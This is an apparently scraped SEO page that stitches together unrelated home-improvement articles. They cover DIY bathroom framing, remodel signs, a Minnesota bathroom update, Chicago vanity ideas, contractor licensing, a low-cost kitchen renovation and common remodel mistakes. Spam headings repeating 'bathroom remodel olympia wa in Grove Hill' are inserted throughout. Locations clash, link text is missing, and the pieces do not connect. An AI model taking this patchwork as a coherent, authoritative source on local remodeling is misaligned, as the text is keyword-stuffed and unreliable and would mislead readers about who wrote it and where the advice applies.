used</p>    </div>    <div>     <p>The customer didn&#x2019;t want to see the shampoo shelves in the reflection in the mirror when walking in</p>    </div>    <div>     <p>Recess niches are tucked away from view</p>    </div>    <p>&#xa0;</p>    <p>&#xa0;</p>    <p>&#xa0;</p>    <p>&#xa0;</p>    <div>     <p>An Ebbe shower drain</p>    </div>    <div>     <p>Shower before</p>    </div>    <div>     <p>Bathroom before</p>    </div>    <p>&#xa0;</p>    <table>     <tbody>      <tr>       <td>        <nobr>         &#xa0;        </nobr></td>      </tr>     </tbody>    </table>   </div>    <div>    <div>     &#x2039;    </div>    <div>     &#x203a;    </div>   </div>    <div>    Posted in Tagged with: , , , , , , ,   </div>   </div>

   <div>   <h2>Undecided About Doing a Bathroom Remodel?</h2>   <div>    <h2><font>The Bathroom is One of the Most Used Rooms in a Home</font></h2>    <p>Are you one of those people that owns a home, likes the layout and the location, but are unhappy and would like to make their home, especially inside, more exciting? There are many homeowners that are content with their home, but are you one of those people that would like more? Have you been considering making some home improvements? If you have, then maybe it&#x2019;s time that you made some changes. You may just need to do some painting here and there, or have new flooring installed, or you may want to do a bathroom remodeling project.</p>   <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>   <h2></h2>   <p></p>    <p>You may wonder if doing a bathroom remodel would be the right move at this time. If you are having trouble whether to have it done or not, then you may want to take a good look around your bathroom and see if there are any signs that indicate that a remodeling project would be appropriate. We are going to talk about some of the signs below that you want to look for and then it should be obvious as to whether you need a bathroom remodel or not. There are a lot of options that you have as to whether you want to just do some small changes or a full blown bathroom remodel.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>One of the signs was noted above, &#x201c;being unhappy and wanting your home to be more exciting&#x201d;. A bathroom remodeling project may be just where you want to start even if your whole home could use some improvement. One reason would be is that there will be a lot of debris that would have to be removed and tracked through the house.</p>   <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>One of the things to look for in your bathroom is, just how much remodeling do you need to have done. Take a look at your sink, is it in rough shape? Is it stained, or pitted? Does it leak? How about the vanity? Is the interior wood damaged from water that may have been leaking? Is the exterior showing signs of wear and tear? Is the tile in your bath/shower stall looking rough and how about those grout joints? They may be cracked or missing grout in places that will cause water to get into your walls. Is the floor so bad that you have to cover it up with rugs? These are some of the questions that could help you to decide what needs to be done.</p>    <h3><font>Leaks Can Cause Serious Damage and Health Risks</font></h3>    <p>Many bathrooms have a window in the bathtub/shower stall that is used for ventilation. Well, this area, if not maintained, is prone to leaks and window damage. The water that leaks through the joints and goes inside your wall could be growing mold. This is not the only area in a bathroom where leaks and mold growth could occur. If your bathroom is suffering from these types of conditions, then you may have no choice, but to do a remodel. Mold growth along with other bad conditions could pose as a health risk.</p>    <p>Another reason that you may want to think about doing a bathroom remodel would if you are planning on putting your house on the market. This may increase the value of your home and also may get you a faster sale. It would be a good idea to check with your real estate agent to see if this would be worth the expense.

Small as your framing project may be, make sure you obtain a city permit nonetheless.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>You&#x2019;ll definitely want:</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <ul>    <li>a nail gun</li>    <li>glue (liquid nails) in a caulking gun</li>    <li>a strike tool (powder actuated tool) if you&#x2019;re building into the lower level concrete</li>    <li>ear plugs for the strike tool. We always shouted, &#x201c;Fire in the hole!&#x201d; before hitting it.</li>    <li>a circular saw/miter saw for ripping your 2&#xd7;4&#x2019;s</li>   </ul>   <p>Then later, we&#x2019;ll show how to put the drywall&#xa0;up.</p>   <p>Check out our lightning fast build. We got the toilet, vanity, shelves, and old plumbing outta there to make room for the new. The boys were even able to salvage the old mirror that was glued to the wall for me to repurpose.&#xa0;Keep in mind the wood isn&#x2019;t warped, it&#x2019;s the fish eye lens from the GoPro camera that makes everything look like it&#x2019;s bowing.</p>   <p>I learned a lot in the process &#x2013; I always thought this was something you hire out, but would never DIY. You can totally do framing yourself. Just have the city check your rough-in&#x2019;s before you nail or glue anything down. I&#x2019;m still a little clunky with the nail gun, but I&#x2019;m working on it.</p>   <h2>Framing</h2>   <p>First, we started with fresh 2&#xd7;4&#x2019;s. It hurt my heart to have to buy so much wood from the lumber yard, but you really want the absolute best quality wooden beams for your new room to be structurally sound. Don&#x2019;t skimp here.</p>   <p>Measure carefully. Envision sheetrock on both sides of your 2&#xd7;4&#x2019;s to give you a better idea of how much floor space these will take up. Glue the bottom 2&#xd7;4&#x2019;s to the concrete once you&#x2019;re sure they&#x2019;re in the right place. No going back from here.</p>   <p>Then you can use your strike tool to nail them into place if working with steel, masonry or concrete.</p>   <p>Seriously guys, this tool is no joke. Be sure to read your safety manual and get certified to use it. It&#x2019;s essentially loaded with gunpowder to drive a big nail into the foundation of your house. Here&#x2019;s a slow-motion video of me trying to drive it in.</p>   <p>&#xa0;</p>   <h2>Raising the <del>Roof</del> Walls</h2>   <p>Start by framing out your ceiling.You&#x2019;ll want to box in any air ducts. Notice we opted for a plastic flexible option on the right for the return air? It saved us a lot of shower space.</p>   <p>&#xa0;</p>   <p>Level all your beams as you&#x2019;re building them into the perimeter of the ceiling. You want your ceiling to be even! Then you can add smaller pieces, spacing them out every foot.</p>   <p>You&#x2019;ll eventually have to cut sheetrock to fit over the 2&#xd7;4&#x2019;s, so just imagine that as you go.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>Once you&#x2019;re done building out the ceiling and the floor, you can move on to the walls.Cut your 2&#xd7;4&#x2019;s to the right height. Space each vertical 2&#xd7;4 one foot apart from the next.</p>   <p>Use your nail gun to tac one side in place, then level it before securing the other end.</p>   <p>The most important part is to measure everything correctly the first time. Be sure things match up with your floor plan and you&#x2019;ll be fine. And level each 2&#xd7;4 so you know you&#x2019;ll get flush walls.</p>   <p>Now you&#x2019;ve got a 3 dimensional room going on!</p>   <p>We&#x2019;re taking this one step further with our shower wall. We wanted a half wall with glass as the upper&#xa0;half. We won&#x2019;t have a door; you&#x2019;ll just walk around the corner. It&#x2019;s kind of hard to visualize and explain, but it will come together and you&#x2019;ll see.</p>   <p>Here&#x2019;s a view from in the shower.</p>   <h5><strong>Next up</strong>: Covering these walls. Joe&#x2019;s already done with electrical and we even tackled the pipes for all the shower jets.</h5>   <div>    <div>     <h3>Related Posts</h3>    </div>   </div>   <div>    <div>     <h3>Care to Share:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>

Whether you are looking to remodel only a small portion of your bathroom or a large portion of it, there is a good chance that you may be in the market for a new toilet.

   <div>   <div>    <p>Regardless of whether you&#x2019;re single, married, or have children, your bathroom is an important part of your house. From getting ready, to showering, to storage space, the it is really the unheralded hero of the home, and so updating it can bring your entire home a new atmosphere. But since the project can be a bit daunting, it&#x2019;s easier to break down the process into a handful of smaller, easier to manage tasks.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>Go in with a plan</p>   <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>Having a plan for a bathroom remodel may seem like overkill &#x2013; until you actually start. If you go into the project without one, you&#x2019;ll quickly realize that it&#x2019;s extremely easy to get off track, to lose focus, and to make even more work for yourself than you started out with. This step needs to be comprehensive to make the rest of the experience go off without a hitch: from taking measurements, to picking color schemes, to deciding whether you&#x2019;ll simply be rearranging or entirely reconstructing your area, it&#x2019;s important to have all of the major decisions made before you even start the actual process.</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>Create a budget</p>    <p>As with all household projects, a bathroom remodel can seem manageable and affordable, but it can actually add up. The truth is, the project can be extremely affordable, but without a thorough budget, it&#x2019;s too easy to get off track with unnecessary spending. Plan out how much you&#x2019;d like to spend for the project and go from there. Take into account the big-picture spending (Will you be retiling? Do any expensive appliances need to be replaced or upgraded?) as well as the minutia (What small decorative aspects would you like to include?). Armed with a budget and maybe a little bit of wiggle room, you&#x2019;ll be able to enjoy all of the project without worrying about funds.</p>    <p>Know your space</p>    <p>Every room is different, and if you want a complete bathroom remodel, it&#x2019;s important to know what space you&#x2019;re working with. It&#x2019;s not just about big or small &#x2013; is your space long and skinny? Wide? Constricted? If you have less space than you want, it may be beneficial to consider inventive storage options, such as racks, corner cabinets, or even the addition of more cabinet space to reduce clutter. Once you&#x2019;re familiar with what you&#x2019;re working with, it will be easier to make the most of whatever space you&#x2019;re in.</p>    <p>Stick with a theme</p>    <p>Because they are generally the smallest rooms of the house, it&#x2019;s very important to stay thematic when you&#x2019;re working on a bathroom remodel. Because the space is constrained, if you begin trying to work with a great number of colors, shapes, and styles when decorating, it may actually just add to the cluttered feel. Try to decide on two or three colors and maybe one decorative aspect (a shape like a spade, or dots). When it comes to a space this small, a little goes a long way whether you want it to look playful or sophisticated.</p>   </div>  </div>

   <div>   <p><strong>Why Kitchen and Bath Remodeling Is So Important</strong></p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>&#xa0;</strong>The kitchen tends to be the social hub of the home. When people visit their friend&#x2019;s house or visit a relative or come home after a long day of work, what is the place where they share stories? When you are having a long celebration in your home, where does much of the congregation occur? When you wake up to get your child to school, where do you enter first? The best bet is the kitchen. Sure, your rooms may be where you share some stories with each other. When you think about it, the parent&#x2019;s room tends to only be where the parents congregate most of the time. Your children&#x2019;s bedroom is where the children congregate most of the time. The library room is probably where not many people congregate, and the guest room is for the guest.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Most of the common areas where people congregate are in the living room or the kitchen. It makes sense then that you should worry about making your kitchen look as nice as possible, because this is where your conversations happen, as well as in your living room. There can be anything from nice granite countertops to marble cutting tables to anything else. They say that the kitchen can be one of the more important parts of the home. The last thing you want to do is deal with a kitchen that people do not want to stay in.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>When the children come home from a game and take a shower, where do they go? They come down to eat, because they deserve it and earned it. When guests come over to visit, they come sit down and havea nice big meal to eat. After all, it is only the common place to be. Your living room and your kitchens are too big areas where you want to have an exciting and good time!</p>   <p><strong>Bathroom Remodeling</strong> is extremely important, because you want to have a bathroom that makes you feel special. The last thing you need is to have a bathroom that looks like you are barely able to survive. You want your bathtub to emphasize the amount of wealth you have and all the hard work you put in to make it the nicest bathroom possible! You want your bathroom to have nice walls, nice scenery, and an enjoyable atmosphere.</p>   <p>When visitors use your restroom, you want them to look and be shocked. You want them to come to your room and say &#x201c;They got money!&#x201d; You want them to say, &#x201c;they know how to live a good life&#x201d;. You want to get compliments for the hard work you put in to get yourself where you need to be. The bathroom is where most thinking happens. Most people take the time to stop and think when they are in the restroom. If you are going to appreciate life, at least contemplate on life with something that is worth appreciating, which is your bathroom.</p>   <p>&#xa0;</p>  </div>

   <div>    <div>    <p>After 4 months or so, our main floor bathroom remodel is finally completed. It took a month for the granite countertop to be ready for pickup and then we waited for our much-abled but inexpensive contractor to come and complete the project.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>What we did:</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <ul>     <li>Removed the wallpaper</li>     <li>Replaced the countertop, faucet, toilet, light fixture, shower rod, exhaust fan, and floor moldings</li>     <li>Primed and painted the walls and ceiling</li>     <li>Sanded and re-varnished the cabinet doors</li>     <li>&#x201c;Waxed&#x201d; the shower stall tiles</li>     <li>Added a new towel ring and towel bar</li>     <li>Patched the wall behind the toilet</li>     <li>Added new cabinet hardware</li>    </ul>    <p>Here are pictures of &#x201c;before&#x201d; the remodel:</p>   <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <div>     <p>Old Wallpaper</p>    </div>    <div>     <p>Main Floor Bathroom Before Remodel</p>    </div>    <div>     <p>Main Bathroom Remodel</p>    </div>    <div>     <p>Removal of frameless mirror</p>    </div>    <div>     <p>Removal of countertop</p>    </div>    <div>     <p>Patching the wall</p>    </div>    <p>The toilet fitting had a leak so that&#x2019;s why the wall had to be repaired.</p>    <p>Here are pictures of &#x201c;after&#x201d; the remodel:</p>    <div>     <p>New Bath Towel &amp; Shower Rod</p>    </div>    <div>     <p>Main Bathroom Remodel</p>    </div>    <p>The cabinet doors were worn on the edges. A friend told me that since they are not &#x201c;real&#x201d; wood (they are veneer) I could gently sand them with 220 grit sandpaper then use a clear varnish on them. Instead of doing the edges only I did both doors and it worked wonders. (Now I need to refrain from going through the house and re-varnishing all the doors and cabinets that have the same problem. That&#x2019;s a good project for the winter months.)</p>    <div>     <p>Granite Countertop with New Faucet</p>    </div>    <p>One of the contractors who came out suggested I &#x201c;wax&#x201d; the shower tiles as it keeps the scum off them so there&#x2019;s less cleaning involved AND they look a little shinier and newer. I thought this was a great idea and it didn&#x2019;t take long to do it.</p>    <p>I had received bids on upgrading the upstairs guest bathroom a few months ago and doing something similar although I was replacing the linoleum tile in that room. Their projected costs (including supplies) was about $7000 and that is IF we gave them the contract to have the master bathroom remodeled also.</p>    <p>The labor cost to have the main bathroom done was around $450. We picked up the the countertop, toilet, exhaust fan, light fixture and the other miscellaneous items. Our contractor picked up any plumbing, electrical and wood supplies he needed and those were included in the $450 cost.</p>    <p>Not bad, eh? The saying &#x201c;you get what you pay for&#x201d; doesn&#x2019;t apply in our case. Our contractor (who currently owns a painting company) is a handy person on the side. He used to own an electrical company that dispatched electricians throughout Minnesota. So, he&#x2019;s a jack-of-all-trades.</p>    <p>Because he is so busy with his current jobs, we can&#x2019;t hire him to do our master bathroom. BUT, he is willing to do the upstairs guest bathroom for us. That one will be a similar project but we&#x2019;ll need to have new tiles, a new floor and a new tub installed so costs will be higher I&#x2019;m sure.</p>    <p>Another &#x201c;new house&#x201d; project to check off. &#xa0;Now to find some nice pictures for the walls &#x2026;</p>    <p>&#xa0;</p>   </div>     </div>

   <div>   <p>Over the past several years, the bathroom sink and vanity has evolved from a tool of necessity to an important design element that enhances a bathroom&#x2019;s overall appearance. While choosing a sink and vanity for your Chicago bathroom remodel&#xa0;was once an easy decision, the number of options available today makes your final selection a bit more difficult. Whether you have your heart set on a modern look or you prefer a cottage style, the following sink and vanity ideas can add a touch of drama to your bathroom.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p><strong>Vessel Sinks</strong></p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>   <p>Because vessel sinks rest directly on top of a vanity&#x2019;s surface, you have a variety of options to use as the sinks base. Placing a porcelain, bowl-shaped vessel on top of a distressed cabinet or table, creates a rustic appearance. On the other hand, situating a rectangle-shaped vessel sink on a stainless steel console, provides your bathroom with a sleek modern design. Vessel sinks are made out of a number of materials, including stainless steel, blown glass, copper and stone. The assortment of material options makes a vessel sink a match for almost every bathroom design.</p>   <p>&#xa0;</p>   <p><strong>Pedestal Sinks</strong></p>   <p>&#xa0;</p>   <p>While some may shy away from the classic Pedestal sink, there are many ways to incorporate the style successfully into your bathroom remodel. If space is an issue, but you dream of double sinks, using two pedestal sinks may be your answer. Placing the sinks side by side, with a few feet in between will take up as much room as a cabinet vanity. The only downfall is the lack of storage pedestal sinks provide. A quick fix for this problem is adding a cabinet in-between the two fixtures.</p>   <p>&#xa0;</p>   <p><strong>Floating Vanity</strong></p>   <p>&#xa0;</p>   <p>A floating vanity is a great addition to a contemporary bathroom. You can choose a minimalist floating cabinet or add a bit more character with a wooden retro look. Instead of a cabinet, which may be to large for your bathroom, you can install a floating console with a vessel sink. Both options have an adequate amount of storage and provide your bathroom with a stylish focal point.</p>   <p>&#xa0;</p>   <p>If you live in the Chicago area and wold like to remodel your bathroom, please to work with one of our experienced contractors.</p>  </div>

   <div>   <p>Looking to turn the construction experience you&#x2019;ve gained from a into your own lucrative business? Whether you&#x2019;re looking to be a general contractor, or you&#x2019;re looking to get involved in residential or commercial property developments, there is always a need for contractors. As eager as you might be to get started, you want to make sure that you&#x2019;ve dotted your eyes and crossed your tees as it pertains to necessary paperwork, registrations, and policies. Most often, first time business owners in the construction industry forget about three important things:</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>1.&#xa0; Licenses</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>2.&#xa0; Surety Bonds</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>3.&#xa0; Business Insurances</p>   <p><b>Secure Your Business Licenses</b></p>   <p>Most states have rules and regulations as they pertain to starting a business in the construction industry. No matter what area you intend to start working in, you&#x2019;re going to need to have a business license. A license essentially states that your business is legally allowed to conduct specific types of work within the area. It also lets customers know that you&#x2019;re legit, and that you&#x2019;re aware of and in compliance with federal and local laws. According to the Small Business Administration, you will need to check your locality to determine which licenses and permits are necessary for your type of construction business.</p>   <p><b>Surety Bonds</b></p>   <p>When you get your first project, chances are you&#x2019;re going to sign some form of contract with the customer. Surety bonds are necessary for construction businesses as a method for ensuring project completion as outlined within the contract. Let&#x2019;s say you started a bathroom remodeling project for a customer, and for some reason or another you failed to complete the job. Because you&#x2019;ve obtained a surety bond with a third party, the company who issued the surety is responsible for either finding another contractor to complete the job or compensating the customer for any financial loss. So essentially, such bonds protect your business&#x2019; integrity and also keep the customer satisfied.</p>   <p><b>Business/Contractor Insurance</b></p>   <p>While it would be nice to assume that you&#x2019;ll never encounter any accidents, you&#x2019;re working in a risky industry. Construction projects whether large or small can result in accidents. Whether it&#x2019;s one of your crew getting hurt while on the job, or a customer who slips and falls on your construction site, being prepared is what matters. Personal injury claims and lawsuits can really put a damper on your business endeavors, and therefore protecting your company against litigation is crucial. General liability or contractors insurance protects your company&#x2019;s assets in the event that something goes wrong. Such insurance will pay for any financial obligations incurred as a direct result of an accident. This may include medical bills, time lost from work, legal fees, and whatever else is necessary.</p>   <p>As you can see, there is a lot of legwork that should be done prior to ever setting foot on your first construction job. In order to ensure the credibility of your business, protect your staff, and gain the trust of consumers, you must make sure that you&#x2019;ve covered all bases. Failure to obtain the above mentioned documents and policies could result in fines, lawsuits, and more importantly, the demise of your new found business. Be sure to talk everything over with a lawyer to ensure that you&#x2019;re protected and in compliance on all levels.</p>   <p>&#xa0;</p>    </div>  
   <div>   <span> &#xbb; , , </span>   <h1>My Cheap DIY Kitchen Renovation: $3,329</h1>   <div>    <span>Last updated by <span><span>G.E. Miller</span></span> on <span>February 7, 2016</span></span>   </div>   <div>    <p>Kitchen renovations are expensive (the is $54K!). However, they don&#x2019;t have to be, with a little DIY effort, planning, and thinking outside of the box. The following story shares how I was able to complete a major kitchen renovation (with high quality materials) for just over $3K!</p>   <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>It all started with a little drip.</p>   <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>My kitchen faucet had started rusting through on a key welding point. The result was a tiny slow leak that would occasionally get big enough to start puddling on to my cheap (and inherited) laminate countertop and seep in at a key seam point. From there, the water was weakening the glue bond and causing the laminate to bubble up in spots. I was done with it.</p>   <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>   <h2></h2>   <p></p>    <p>At this point, I knew that the faucet and countertop needed some changing up. However, when you change a countertop, you also need to change the backsplash (due to the height of the new counter being different. Mine was very outdated and ugly, so this fact did not sadden me.</p>    <p>Meanwhile, a few of my appliances were on their last breath, as they were all nearing the 20-year mark. They were inefficient in their use of energy and had definitely seen much better days. And the mix of black, white, and wear did not match anything else in the kitchen. Normally, I&#x2019;d be willing to overlook this, but in light of the other deficiencies, it was time for some updating.</p>    <p>To top it all off, my stainless sink was a small, loud, cheap, and scratched-up contractor grade sink, with very little depth for holding and washing dirty kitchenware.</p>    <p>I wish I would have taken a more expansive photo, but here&#x2019;s a &#x201c;before&#x201d; photograph (post backsplash tear-down):</p>    <p>Luckily, my cabinets had always been the bright spot of the kitchen, as you can probably see from the photo. They were custom built, from scratch, by the previous homeowner and have a rustic, natural look, which we like. They could use a bit of resurfacing in areas, but they weren&#x2019;t going anywhere. After hearing how new cabinets can cost in the upwards of TENS OF THOUSANDS, we were feeling very lucky.</p>    <p>All things considered, it was time for a kitchen renovation!</p>    <p>We set out with the following five goals in mind:</p>    <ol>     <li>Minimal cost, without sacrificing quality.</li>     <li>As much DIY as possible to save money and learn.</li>     <li>No waste. We didn&#x2019;t want anything to end up in the landfill.</li>     <li>A look and functional utility that we&#x2019;d be happy with for many years to come (and would be looked at as an asset by any potential homebuyer, should we move at some point).</li>     <li>Efficiency.</li>    </ol>    <p>How did do? Here&#x2019;s a deeper look at each purchase.</p>    <h3>Countertop:</h3>    <p>We knew this would be our biggest expense and have the highest impact. Given the rustic pine look, we couldn&#x2019;t go with a wood countertop. Both wood and tile are high maintenance as well. That left us with stone, which is low maintenance, looks great, and is the desirable standard for homebuyers.</p>    <p>Unfortunately, stone is not cheap. After a lot of research, we decided to go with a crushed quartz countertop over granite due to its durability and finish. After looking around, we noticed that one particular style ( Kilauea) at Home Depot that we liked would often go on sale (10% off). On top of that, we also noticed that Home Depot runs &#x201c;10% off installations&#x201d; once every 6 weeks or so and it could be stacked on top of any individual style discounts. So we waited&#x2026; and ended up saving 20% off of full price.</p>    <p>Additionally, we declined removal of the old countertop (we tore it off ourselves) and an undermount sink installation (opting for an over-mount), saving us $500. We put the old counter on Craigslist, listed for free, and within a few days it was picked up. Landfill avoided.</p>    <p>An interesting note to anyone thinking of granite &#x2013; the installers said they would personally go with quartz over granite any day of the week, because of its added durability &#x2013; they had seen way to many granite counters break.</p>    <p>Total cost for 36 square feet installed (20% off, plus sales tax) = $1,978.</p>    <h3>Sink:</h3>    <p>We decided to go with a crushed composite granite sink, because they don&#x2019;t scratch and aren&#x2019;t loud &#x2013; and we love it. We elected to do an over-mount, which saved us $260 on installation from Home Depot. We went with a on Amazon because it had a perfect 5-star rating (with 127 reviews!) and it was 10 inches deep on the large side (for large pots/pans), with a functional lowered partition.</p>    <p>I was able to sell the old sink on Craigslist for $25.</p>    <p>We also re-plumbed the sink and saved about $150 on installation.</p>    <p>Total cost (49% off msrp) = $256</p>    <h3>Faucet:</h3>    <p>We wanted a stainless steel faucet for their reliability and to have a nice contrast with the black granite sink. We liked the price, functionality, and lifetime warranty (after the failure of our previous faucet) on the .</p>    <p>We recycled the old faucet.</p>    <p>Total cost (42% off msrp): $94 (free with gift cards)</p>    <h3>Appliances:</h3>    <p>Long story short (I previously highlighted and and get at least 25% off EVERY TIME) &#x2013; we ended up going with highly rated, yet low cost Whirlpool appliances, all from Sears. This was after much shopping around and Craigslist scouring.</p>    <p>All appliances were stainless steel (the fridge was faux stainless) and the dishwasher and fridge were extremely high efficiency and Energy Star (microwaves and ovens are not rated by Energy Star).</p>    <p>Additionally, I was able to sell each of my old appliances on Craigslist for the following:</p>    <ul>     <li>dishwasher: $35</li>     <li>microwave: $35</li>     <li>refrigerator: $150</li>     <li>stove: $160</li>     <li><strong>total: $380</strong></li>    </ul>    <p>This was very satisfying.</p>    <p>Here is what we ended up paying for each (including tax and free delivery) of the new appliances:</p>    <ul>     <li>dishwasher: $290 (regularly $480)</li>     <li>microwave: $208 (regularly $259)</li>     <li>refrigerator: $665 (regularly $900)</li>     <li>stove: $375 (regularly $729)</li>     <li><strong>total: $1,538 (regularly $2,368) &#x2013; 35% off! </strong></li>    </ul>    <p>Considering many newer stainless refrigerators cost $1,500 on their own, I was extremely pleased with the total cost and quality. And when you factor in the $380 I got for my old appliances, my total net cost for 4 new, efficient, stainless appliances was just $1,158!</p>    <p>We self-installed each appliance, which was a learning experience and saved us a few hundred dollars.</p>    <h3>Backsplash:</h3>    <p>The final and most component of the renovation was the backsplash. Many installers charge upwards of $40/sq. foot (!) for backsplash tiling which means you better damn well learn to tile for yourself! We had never done any prior tile work, so this was a great learning experience.</p>    <p>We wanted a 3&#x2033; x 6&#x2033; subway-style tile. Unfortunately, outside of pricey $10/sq. foot stone tile, nobody makes anything but solid white and black subway tiles. So&#x2026; we decided to buy 12&#x2033; x 12&#x2033; ceramic tile and make cuts, with each producing 8 tiles. This had the dual benefit of not only giving us much more variety in choice of tile, but also massive cost savings &#x2013; at just $0.79/sq. foot! And as you can see, via the photo to the right, we got a stone look with a printed ceramic for about 1/15th the price of stone tile.</p>    <p>We first rented a wet saw from Home Depot to do all of the cutting. Big mistake. Ours was not making straight cuts and it was nearly impossible to guarantee each cut piece was close to identical in size, so we returned it and got a refund. Then, I ended up purchasing a from Lowe&#x2019;s and the cuts were near perfect every time. And now I can use the cutter for all future jobs.</p>    <p>Total cost for the cutter  3 boxes of tile  grout  tools = $140</p>    <h3>The End Result:</h3>    <p>How did we do against all of our goals?</p>    <ol>     <li><strong>Minimal cost, without sacrificing quality.</strong> Massive success. We love the quality and not many kitchen renovations can be done with all new materials for a net of $3,329, subtracting what we were able to sell. The total cost on product at full price was $5,806. Additionally, we saved about $2,000 by opting for DIY versus having all the work outsourced.</li>     <li><strong>As much DIY as possible to save money and learn.</strong> Achieved. We were DIY on everything we could have been: tear-down, sink, faucet, plumbing, appliance hookup, and backsplash.</li>     <li><strong>No waste. We didn&#x2019;t want anything to end up in the landfill.</strong> Huge success! Outside of a few broken tiles, literally nothing ended up in a landfill. Everything was donated, sold, or recycled.</li>     <li><strong>A look and functional utility that we&#x2019;d be happy with for many years to come (and would be looked at as an asset by any potential homebuyer, should we move at some point).</strong> Mostly successful. We don&#x2019;t have the most modernized, high-end kitchen, but I don&#x2019;t think many buyers at our home price point are going to find a much nicer kitchen. Granted, the cabinetry gives it a very rustic look, which is not everyone&#x2019;s cup of tea.</li>     <li><strong>Efficiency.</strong> We were efficient where we could be: dishwasher, refrigerator, and low-flow faucet.</li>    </ol>    <p>And here&#x2019;s the end result:</p>    <p>Not bad at all!</p>    <p>Have you renovated your kitchen?

   <div>   <h1>5 Bathroom Remodel Mistakes (and How You Can Do Better)</h1>   <h2>Want to leave your bathroom in infinitely worse shape than when you started? We didn&#x2019;t think so. Steer clear of these pitfalls.</h2>   <p>Think you&#x2019;re ready to dive headfirst into that beautiful bathroom remodel? Not so fast&#x2026; : half-finished bathrooms with no running water, year-old materials already falling apart and worse. Take heed of these pitfalls to make sure your new-look bathroom is finished on time, in style and without the migraines.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <ol>    <li><strong>Putting carpet anywhere</strong>: ANYWHERE<strong>.</strong> Say no to bathroom carpet. Moisture is going to take its toll on practically any surface, but properly installed will hold up as well as anything. Even mid-range linoleum will struggle with prolonged puddled water, which is just a reality in a family bathroom. Carpet, though, is a disaster waiting to happen. If you absolutely must have a plush surface to stand on in your bathroom, we recommend a memory foam mat &#x2013; extra luxurious, easy to replace.</li>    <li><strong>Covering up previous renovations</strong>: It&#x2019;s tempting to merely cover up a previous homeowner&#x2019;s shoddy DIY job &#x2013; but not only could this lead to other issues to fix down the line, it could also be dangerous. Trusting another worker&#x2019;s questionable electrical work, especially around moisture, is asking for trouble. Starting from scratch with your bathroom remodel gives you more peace of mind you&#x2019;re doing the job right, and can also give you more opportunities to change up the layout for the better. The same goes for plumbing: it may seem straightforward, but one component not completely sealed-off can wreak havoc in your newly spruced-up bathroom. Take care that your plumbing and electrical, in plain sight and behind the scenes, has been properly installed for your new layout and fixtures.</li>    <li><strong>Leaving the layout as</strong>&#x2013;<strong>is</strong>: If you&#x2019;re taking the time and money to give your bathroom a new look, you might as well get the layout right! Bathroom designs from homes of all eras have gotten the layout completely wrong, so you may want to have a professional at least suggest some alternatives. Or, try plotting out your current bathroom using a free floor-plan app to toy with new layouts yourself.</li>    <li><strong>Ignoring hidden issues</strong>: Mold is a serious issue in many bathrooms &#x2013; many more, in fact, than might be obvious. Most strains of these moisture-loving fungi can make healthy people sick, and some can cause significant illnesses. If you&#x2019;re a new homeowner and are appreciating the fresh coat of paint in your otherwise behind-the-times bathroom, there&#x2019;s a good chance the previous homeowner had something to hide. Check inside cabinets, around pipes and any other tricky spaces. If you have any reason to believe mold has reached structural wood, you&#x2019;ll want to conduct a mold test to know what you&#x2019;re dealing with <em>before </em>you&#x2019;re invested in the renovation.</li>    <li><strong>Contracting without research, or DIYing without experience</strong>: Homeowners often try to get the biggest bang for their buck by taking on tasks that aren&#x2019;t really safe, DIY territory. Others simply choose the cheapest contractor for the job. In both cases, the bathroom &#x2013; and family &#x2013; are at the mercy of the worker&#x2019;s time management skills. In the case of tile setting, for example, starting but not finishing the project can actually ruin the material before it&#x2019;s ever set. Your bathroom isn&#x2019;t the place to cut corners. Find a contractor with at least three positive references for the best chance of your project going the way you expect &#x2013; the first time around.</li>   </ol>   <p>Firenza Stone provides a wide range of premium stone for bathroom remodel projects, and can also connect you with leading contractors and designers in the greater Cleveland area.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>  </div>

